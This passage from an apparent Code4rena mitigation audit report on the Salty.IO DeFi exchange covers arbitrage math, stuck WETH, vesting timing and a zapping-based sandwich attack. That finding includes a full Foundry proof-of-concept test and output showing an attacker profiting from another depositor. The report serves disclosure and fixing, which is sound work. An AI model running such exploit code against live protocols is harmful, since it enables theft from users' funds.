| M-15 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/18), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/98), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/80) |
| M-16 |  🔴 Mitigated with an Error| Report from   [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101)|
| M-18 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/19), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/99), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/81) |
| M-19 | 🔴  Mitigated with an Error | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82) |
| M-20 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/59), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/103), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/83) |
| M-21 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/84), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/104), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/20) |
| M-22 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/21), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/105), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/85) |
| M-25 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/106), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/86), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/22) |
| M-26 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/87), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/107), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/23) |
| M-27 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/109), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/88), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/24) |
| M-28 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/89), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/110), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/56) |
| M-29 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/111), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/90), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/26) |
| M-30 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/91), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/112), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/27) |
| M-31 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/15), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/113), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/92) |
| E-01 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/114), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/120), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/34) |
| E-02 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/115), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/121), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/38) |
| E-03 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/35), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/122), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/116) |
| E-04 | 🔴 Mitigated with an Error | Report from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/123)|
| E-05 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/118), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/124), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/37) |
  
The wardens surfaced several new findings and mitigation errors. In total, 8 Medium severity vulnerabilities were uncovered during this phase. See below for full details on these as well as one Low severity issue that the judge deemed worthy of inclusion.

## [Missed Arbitrage Profits from Imbalanced Pools](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101)
*Submitted by [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101), also found by [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/119)*

Severity: Medium

<https://github.com/othernet-global/salty-io/blob/d47eae920d5840afadd5fd5d1fd0d6da0107c034/src/arbitrage/ArbitrageSearch.sol#L115-L133>

### C4 issue

M-16: Suboptimal arbitrage implementation

### Comments

The issue addressed the protocol's potential to overlook profitable trades due to its search range limitations. The bisection search method employed by the protocol might miss profit opportunities when the pools are balanced and a user wants to swap an amount of one token for another. This is crucial since arbitrage is a key feature that should always be available to users for capitalizing on price differences across various liquidity pools.

### Mitigation

<https://github.com/othernet-global/salty-io/commit/a54656dd18135ca57eef7c4bf615b7cdff2613a7>

The mitigation succesfully implemented the updated ArbitrageSearch algorithm to follow suit with the math and also the example code provided in the issue, but it additionally made sure the overflow risk is reduced since the math involves multiplications of multiple reserves(which could be substantial) primarily in the calculations of n1 and n0.

However upon further inspection, an edge case arises where if the pools were severely imbalanced, this scenario can occur:

1.  One of the reserves has a MSB more than 80.
2.  All reserves are shifted by "shift = maximumMSB - 80" to ensure none of them is more than 80 bits.
3.  However some reserves are too low, and shifting them by this magnitude sets them to equal 0.
4.  those reserves shifted to zero set n1 and n0 to 0.
5.  the check that n1 <= n0 is true and function returns 0, even though n1 could have been higher than n0 before the shift.

### Impact

As with the original intention of the issue, there is potential for the algorithm to miss arbitrage profits, albeit due to a different reason and under a different circumstance, which applies here when the pools are imbalanced, and to how overflow is handled in the calculations.

### Proof of Concept

<details>


    	function testArbitrageMethods() public view {
            // Initial, roughly balanced pools
            // 18 ETH ~ 1 BTC ~ 40k TOKEN A
            // uint256 reservesA0 = 900 ether; // ETH
            // uint256 reservesA1 = 2000000 ether; // TOKEN A
            // uint256 reservesB0 = 4000000 ether; // TOKEN A
            // uint256 reservesB1 = 100 ether; // BTC
            // uint256 reservesC0 = 500 ether; // BTC
            // uint256 reservesC1 = 9000 ether; // ETH

    		uint256 reservesA0 = 90000000; // ETH
    		uint256 reservesA1 = 900000000; // TOKEN A
    		uint256 reservesB0 = 900000000; // TOKEN A
    		uint256 reservesB1 = 200000000100 ether; // TOKEN B
    		uint256 reservesC0 = 1500000000; // TOKEN B
    		uint256 reservesC1 = 1000 ether; // ETH

            for (uint256 i = 0; i < 4; i++) {

                console.log("");

                uint256 bestApproxProfit;
                uint256 auxReservesB1;
                uint256 auxReservesB0;

                {
                    // Swap BTC for TOKEN A
                    uint256 swapAmountInValueInBTC = 1 ether * (i + 1);  // Arbitrary value for test
                    console.log(i, "- swap", swapAmountInValueInBTC / 10 ** 18, "BTC for TOKEN A");
                    auxReservesB1 = reservesB1 + swapAmountInValueInBTC;
                    auxReservesB0 = reservesB0 - reservesB0 * swapAmountInValueInBTC / auxReservesB1;

    				uint256 gas0 = gasleft();
                    uint256 bestBrute = _bruteForceFindBestArbAmountIn(swapAmountInValueInBTC / 18, reservesA0, reservesA1, auxReservesB0, auxReservesB1, reservesC0, reservesC1);
    				console.log( "BRUTE GAS: ", gas0 - gasleft() );

                    console.log("Original brute arbitrage estimation: ", bestBrute);
                    bestApproxProfit = getArbitrageProfit(bestBrute, reservesA0, reservesA1, auxReservesB0, auxReservesB1, reservesC0, reservesC1);
                    console.log("Brute arbitrage profit: ", bestApproxProfit);
                }

    			uint256 bestExact;
    			unchecked
    				{
    				uint256 gas0 = gasleft();
                	bestExact = _bestArbitrageIn(reservesA0, reservesA1, auxReservesB0, auxReservesB1, reservesC0, reservesC1);
    				console.log( "BEST GAS: ", gas0 - gasleft() );
    				}

                console.log("Best arbitrage computation: ", bestExact);
                uint256 bestExactProfit = getArbitrageProfit(bestExact, reservesA0, reservesA1, auxReservesB0, auxReservesB1, reservesC0, reservesC1);
                console.log("Best arbitrage profit: ", bestExactProfit);

    			// Assumes an ETH price of $2300
    			if (bestExactProfit > bestApproxProfit)
                console.log("PROFIT IMPROVEMENT (in USD cents): ", 2300 * (bestExactProfit - bestApproxProfit) / 10 ** 16);
    			if (bestApproxProfit > bestExactProfit)
    			console.log("PROFIT DECREASE (in USD cents): ", 2300 * (bestApproxProfit - bestExactProfit) / 10 ** 16);
            }
        }
</details>

THe POC above has reserve values which simulate the imbalanced pools scenario. It also shows the missed arbitrage profits through using the new algorithm compared with the brute force method.

### Recommendation

Explore ways to handle overflow that will not impact potential arbitrage profits.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101#issuecomment-1996369771):**
 > The maximum number of bits required for either a0*b0*c0 or a1*b1*c1 is now determined and then the required shift to keep either product within 240 bits is made.
> 
> Fixed within: https://github.com/othernet-global/salty-io/commit/ab3e5d50097c39b36951f4a85556f7d43332dc16
> 
> 	// Given that x, y and z will be multiplied: determine the bit shift necessary to keep the product contained in 240 bits
> 	function _shiftRequired( uint256 x, uint256 y, uint256 z ) internal pure returns (uint256)
> 		{
> 		unchecked
> 			{
> 			// Determine the maximum number of bits required without shifting
> 			uint256 requiredBits0 = _mostSignificantBit(x) + _mostSignificantBit(y) + _mostSignificantBit(z);
> 
> 			// Already fits in 240?
> 			if ( requiredBits0 < 240 )
> 				return 0;
> 
> 			// Each number will be shifted so we can divide the required difference by 3
> 			return Math.ceilDiv( requiredBits0 - 240, 3 );
> 			}
> 		}
> 
> 
> 	// Determine the shift required to keep a0 * b0 * c0 and a1 * b1 * c1 within 240 bits
> 	function _determineShift( uint256 a0, uint256 b0, uint256 c0, uint256 a1, uint256 b1, uint256 c1 ) internal pure returns (uint256)
> 		{
> 		uint256 shift0 = _shiftRequired(a0, b0, c0);
> 		uint256 shift1 = _shiftRequired(a1, b1, c1);
> 
> 		return shift0 > shift1 ? shift0 : shift1;
> 		}
> 

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101#issuecomment-1996636892):**
 > See conversation on [#119](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/119)

***

## [The WETH arbitrage profits that are not swapped to SALT will be stuck in `Pools`](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/123)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/123)*

Related to: E-4
Severity: Medium

[commit 6998661](https://github.com/othernet-global/salty-io/commit/6998661013e86a50c7db552d189fadb0521dbeb0)
In the pervious implementation, the WETH arbitrage profits will be swapped to SALT immediately in `_arbitrage()` function. However, it could fail if there is no SALT/WETH liquidity in `Pools`.
The mitigation skipped the swapping step if there is no SALT/WETH liquidity.

### Vulnerability details

The WETH arbitrage profits were not swapped to SALT because the mitigation skipped the swapping step under zero SALT/WETH liquidity. However, it doesn't record this for future swapping. As a result, all WETH arbitrage profits obtained under zero SALT/WETH liquidity will be stuck in Pools.

### Recommended Mitigation Steps

Introduce a variable to accumulate the unswapped arbitrage profits and attempt to swap them for SALT next time.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/123#issuecomment-1996296071):**
 > This is acceptable as it will only happen momentarily when the exchange is launched, and checking another variable for pending WETH to use would increase gas costs forever.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/123#issuecomment-2003826564):**
 > Medium severity seems justified to me as there is a "leak value with a hypothetical attack path with stated assumptions, but external requirements" although the impact remains small.

***

## [The SALT distributions of DAO Reserve and Initial Development Team start from the deployment time rather than the exchange activation time](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/125)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/125)*

Severity: Medium

The protocol's reputation could be damaged due to distributing more SALT than expected to the DAO and development team. It's difficult to pinpoint the direct loss, but at the very least, users' willingness to become liquidity providers on Salty may be affected due to unfair initial SALT distribution.

### Proof of Concept

When Salty exchange is actived,

25M SALT will be transferred to `daoVestingWallet` and 10M SALT will be transferred to `teamVestingWallet` by calling [`InitialDistribution#distributionApproved()`](https://github.com/othernet-global/salty-io/blob/main/src/launch/InitialDistribution.sol#L56-L60):

```solidity
56:	    // 25 million		DAO Reserve Vesting Wallet
57:		salt.safeTransfer( address(daoVestingWallet), 25 * MILLION_ETHER );
58:
59:	    // 10 million		Initial Development Team Vesting Wallet
60:		salt.safeTransfer( address(teamVestingWallet), 10 * MILLION_ETHER );
```

*   `daoVestingWallet` is responsible for distributing 25M SALT to `DAO` linely over 10 years
*   `teamVestingWallet` is responsible for distributing 10M SALT to `teamWallet` linely over 10 years

Check the smart contract deployments in [Deployment.sol](https://github.com/othernet-global/salty-io/blob/main/src/dev/Deployment.sol#L213-L214):

```solidity
213:		daoVestingWallet = new VestingWallet( address(dao), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
214:		teamVestingWallet = new VestingWallet( teamWallet, uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
```

As we can see, the distribution start time of `daoVestingWallet` and `teamVestingWallet` is the deployment time. However the exchange is not active at the moment.
If we check line 216 in [Deployment.sol](https://github.com/othernet-global/salty-io/blob/main/src/dev/Deployment.sol#L216), we can see that it will take at least 5 days to active the exchange because `ballotDuration` was initialized to `5 days`.

```solidity
		bootstrapBallot = new BootstrapBallot(exchangeConfig, airdrop, 60 * 60 * 24 * 5 );
```

From the above we can see, `DAO` and `teamWallet` can get 5 days SALT distribution immediately once the exchanged is active.

Copy below codes to [BootstrapBallot.t.sol](https://github.com/othernet-global/salty-io/blob/main/src/launch/tests/BootstrapBallot.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test test_finalizeBallotThenCheckVestingBalance`

```solidity
    function test_finalizeBallotThenCheckVestingBalance() public {
        // Voting stage (yesVotes: 2, noVotes: 0)
        //@audit-info deploy all contract
        initializeContracts();
        bytes memory sig = abi.encodePacked(aliceVotingSignature);
        vm.startPrank(alice);
        bootstrapBallot.vote(true, sig);
        vm.stopPrank();

        sig = abi.encodePacked(bobVotingSignature);
        vm.startPrank(bob);
        bootstrapBallot.vote(true, sig);
        vm.stopPrank();

        // Increase current blocktime to be greater than completionTimestamp
        vm.warp( bootstrapBallot.completionTimestamp());

        assertEq( salt.balanceOf(address(initialDistribution)), 100000000 ether);

        // Call finalizeBallot()
        bootstrapBallot.finalizeBallot();

        // Verify that the InitialDistribution.distributionApproved() was called.
        assertEq( salt.balanceOf(address(initialDistribution)), 0);
        //@audit-info non-zero SALT can be released to dao and teamWallet immediately 
        assertEq(daoVestingWallet.releasable(address(salt)),   34246575342465753424657);
        assertEq(teamVestingWallet.releasable(address(salt)),  13698630136986301369863);
    }
```


### Recommended Mitigation Steps

The vesting start time should not be early than the exchange activation time.
It is recommended to deploy `daoVestingWallet` and `teamVestingWallet` in `InitialDistribution#distributionApproved()`, and use `block.timestamp` as start timestamp.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/125#issuecomment-1994131329):**
 > Waiting for the sponsor's input but it can make sense to want the team and the DAO to have an initial allocation.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/125#issuecomment-1996327648):**
 > VestingWallets now start at boostrapBallot.completionTimestamp
> 
> Fixed in: https://github.com/othernet-global/salty-io/commit/46d395f791a8e3a5d8753eb3f4918cc0e24b23d0

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/125#issuecomment-1996715470):**
 > Following the sponsor's answer, it seems that this was indeed unintended. As a functionality of the protocol isn't working as expected but funds aren't really at risk, I'll validate under Medium severity.

***

## [Adding liquidity with `useZapping = true` allows user to steal funds](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127)*

Severity: Medium

The function [depositLiquidityAndIncreaseShare() can be called with useZapping = true](https://github.com/othernet-global/salty-io/blob/main/src/staking/Liquidity.sol#L88-L89) which internally swaps one token to another in order to maintain the correct ratio and then makes the deposit. This can be exploited to gain funds.

### Details

The protocol has taken important steps which either make a traditional sandwich attack unprofitable for the attacker or impossible to execute altogether. These are -

*   AAA i.e. the internal atomic arb.
*   [Limiting user swaps to one per block to prevent bypassing arbitrage within a single block](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:\~:text=Limited%20user%20swaps%20to%20one%20per%20block%20to%20prevent%20bypassing%20arbitrage%20within%20a%20single%20block). This also makes sure that a malicious user can not perform a sandwich attack by front-running another user's liquidity addition. The malicious front-run-swap and later on the back-run-swap won't be allowed by the protocol in a single block.

These constraints are however bypassed by calling the function `depositLiquidityAndIncreaseShare()` with `useZapping = true`. <br>

Instead of doing a front-run-swap, simply let the zapping feature do it for you. This internal swap is not recorded as an actual "swap" by the protocol and hence when later on a back-run-swap is executed, it's not reverted in spite of being in the same block. Additionally, [arbitrage no longer occurs when zapping liquidity](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:\~:text=Arbitrage%20no%20longer%20occurs%20when%20zapping%20liquidity), as implemented in [this PR](https://github.com/othernet-global/salty-io/commit/f16623e6bf1cdb0845b83ebf3592e30885a8fc61). So you have now bypassed AAA as well.

### Attack Scenario

*   In a pool of `token1` and `token2`, the fair ratio to be maintained for `token1:token2` is `1:1`. One can imagine that `1 wei` of each token = `$1`.
*   The first depositor, Alice calls `depositLiquidityAndIncreaseShare(token, token2, 100 ether, 100 ether, 100 ether, 100 ether, 200 ether, block.timestamp, false)` to deposit `100 ether` of each token with proper slippage parameters. She gets `2 * 100 ether = 200e18` shares.
*   Another depositor, Charlie calls `depositLiquidityAndIncreaseShare( token1, token2, 100 ether, 100 ether, 100 ether, 99 ether, 199 ether, block.timestamp, false )` to attempt a deposit of `100 ether` of each token. He understands that in a dynamic market various swaps might be happening at the same time, effecting the price ratios, hence provides a slippage of around `1%` for token2 by specifying minimum token2 as `99 ether` and minimum shares as `199 ether`. He does not tolerate any slippage for token1 in our example.
*   Bob, who is a malicious user, front-runs Charlie and calls `depositLiquidityAndIncreaseShare( token1, token2, 1 ether, 0, 0, 0, 0, block.timestamp, true )` to add `1 ether` of token1 with `useZapping = true`.
*   The protocol makes the internal swap. If we inspect the reserves after this, we find:

```js
  new balances: token1 = 100999999999999999999, token2 = 100000000000000000000
  Manipulated ratio of token2:token1 =: 0.990099009900990099
```

*   The internal zap-swap has resulted in the ratios to change.
    *   **Note that** Bob can use multiple alternate accounts of his to call `depositLiquidityAndIncreaseShare()` with `useZapping = true` multiple times. This would skew the ratio even further. He just needs to take care to be within the slippage limits set by Charlie.
*   Charlie's transaction goes through after Bob's transaction. His slippage parameters were invoked.
*   Bob now swaps `1 ether` of token2 for token1. He calls `depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp)` and receives `1.004950249987624375 ether` of token1, higher than the market rate of `1 ether`.
*   Bob now withdraws his entire liquidity shares to make a profit of `$2462673092946115`.

### Impact

Bob can steal funds from Charlie and profit.

### Proof of Concept

<details><summary>Click to view PoC</summary>

Create a new file `src/staking/tests/ZapSwap.t.sol` with the following code and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_t0x1c_ZapSwapGain`:

```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract ZapSwap is Deployment
{
	bytes32[] public poolIDs;
	bytes32 public pool1;

	IERC20 public token1;
	IERC20 public token2;

	address public constant alice = address(0x1111);
	address public constant bob = address(0x2222);
	address public constant charlie = address(0x3333);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

	function setUp() public
	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

		token1DecimalPrecision = 18;
		token2DecimalPrecision = 18;

		token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

		pool1 = PoolUtils._poolID(token1, token2);

		poolIDs = new bytes32[](1);
		poolIDs[0] = pool1;

		// Whitelist the _pools
		vm.startPrank( address(dao) );
		poolsConfig.whitelistPool(token1, token2);
		vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


		salt.approve(address(liquidity), type(uint256).max);

		vm.startPrank(alice);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(bob);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(charlie);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		// DAO gets some salt and pool lps and approves max to staking
		token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
		token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
		vm.startPrank(address(dao));
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();
	}

	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
	{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return liquidity.totalSharesForPools(_pools2)[0];
	}
	
	function test_t0x1c_ZapSwapGain() public {  
		// ******************************* SETUP **************************************
		// Give Alice, Bob & Charlie some tokens for testing
		token1.transfer(alice, 100 ether);
		token2.transfer(alice, 100 ether);
		token1.transfer(bob, 1 ether);
		token2.transfer(bob, 1 ether);
		token1.transfer(charlie, 100 ether);
		token2.transfer(charlie, 100 ether);

		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq(liquidity.userShareForPool(alice, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(charlie, pool1), 0, "Charlie's initial liquidity share should be zero");
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
		assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// deposit ratio of 1:1 i.e token1's price is 1 times that of token2
		uint256 addedAmount1 = 100 ether;
		uint256 addedAmount2 = 100 ether;

		// Alice adds liquidity in the correct ratio, as the first depositor
		vm.prank(alice);
		uint256 addedLiquidityAlice = liquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, addedAmount1, addedAmount2, addedAmount1 + addedAmount2, block.timestamp, false );
		console.log("initial balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Initial ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		assertEq(liquidity.userShareForPool(alice, pool1), addedLiquidityAlice, "Alice's share should have increased" );
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
		assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		assertEq(totalSharesForPool( pool1 ), addedLiquidityAlice, "totalShares mismatch after Alice's deposit" );
		uint256 bobInitialBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		// ******************************* SETUP ENDS **************************************
		
		console.log("\n\n***************************** Bob Zap-Swap Attack ************************************\n");

		vm.prank(bob);
		uint256 addedLiquidityBob = liquidity.depositLiquidityAndIncreaseShare( token1, token2, 1 ether, 0, 0, 0, 0, block.timestamp, true );
		console.log("new balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Manipulated ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		// Charlie transaction goes through now which adds liquidity with suitable slippage parameters
		vm.prank(charlie);
		// @audit-info : 1% slippage for token2
		liquidity.depositLiquidityAndIncreaseShare( token1, token2, 100 ether, 100 ether, 100 ether, 99 ether, 199 ether, block.timestamp, false );

		// Bob swaps
		vm.prank(bob);
		(uint256 swappedOut) = pools.depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp);
		emit log_named_decimal_uint("token1 swappedOut in exchange for 1 ether of token2 (should be greater than 1 ether) =", swappedOut, 18);

		skip(1 hours);
		vm.prank(bob);
		liquidity.withdrawLiquidityAndClaim(token1, token2, addedLiquidityBob, 0, 0, block.timestamp);

		uint256 bobFinalBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		assertGt( bobFinalBalance, bobInitialBalance, "Bob did not profit" );
		console.log("\nProfit made by Bob = $", bobFinalBalance - bobInitialBalance);
	}
}
```

</details>

Output:

```js
[PASS] test_t0x1c_ZapSwapGain() (gas: 947570)
Logs:
  initial balances: token1 = 100000000000000000000, token2 = 100000000000000000000
  Initial ratio of token2:token1 =: 1.000000000000000000


***************************** Bob Zap-Swap Attack ************************************

  new balances: token1 = 100999999999999999999, token2 = 100000000000000000000
  Manipulated ratio of token2:token1 =: 0.990099009900990099

  token1 swappedOut in exchange for 1 ether of token2 (should be greater than 1 ether) =: 1.004950249987624375

Profit made by Bob = $ 2462673092946115
```

### Recommended Mitigation Steps

The `useZapping = true` option gives users the power to perform multiple actions which are otherwise actively blocked by the protocol individually. I would recommend to remove the zap functionality altogether. Removing this along with the fixes proposed in the following bug reports + the newly added features by the protocol should be sufficient to thwart any sandwich attacks via reserve ratio manipulation:

*   Report titled *"Rounding loophole while adding liquidity can be exploited to steal value"*
*   Report titled *"`removeLiquidity()` executes unbalanced token removal due to rounding bug, allowing user to steal funds"*
*   *"Limited user swaps to one per block to prevent bypassing arbitrage within a single block"* implemented in [this PR](https://github.com/othernet-global/salty-io/commit/2d1b7df004394720c0d8bb4aefe903021631eff3) (under *Extra scope* [E5](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:\~:text=Limited%20user%20swaps%20to%20one%20per%20block%20to%20prevent%20bypassing%20arbitrage%20within%20a%20single%20block)).
*   Salty's inherent AAA.


**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127#issuecomment-1994157844):**
 > This report shows how some restrictions can be bypassed by using [depositLiquidityAndIncreaseShare](https://github.com/othernet-global/salty-io/blob/main/src/staking/Liquidity.sol#L88-L89)

**[othernet-global (Salty.IO) disputed and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127#issuecomment-1996075644):**
 > Charlie wanted to deposit 100 token1 and 100 token2 for 200 liquidity.
> Instead they are depositing 100 token1 and 99.0099 token for 199.0074 liquidity.
> 
> They are depositing less and are getting a very close amount of liquidity to what they would expect. 
> 
> If, after the attack Charlie withdraws their tokens, they still have 199.99753719 of token1 and token2 which is acceptably close to the 200 they started with.


**[Picodes (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127#issuecomment-1996806548)**

***

## [Rounding of `user.virtualRewards` happens in user's favour inside `claimAllRewards()`](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25)*

Severity: Medium

<https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L161-L166> 

<https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L250-L256> 

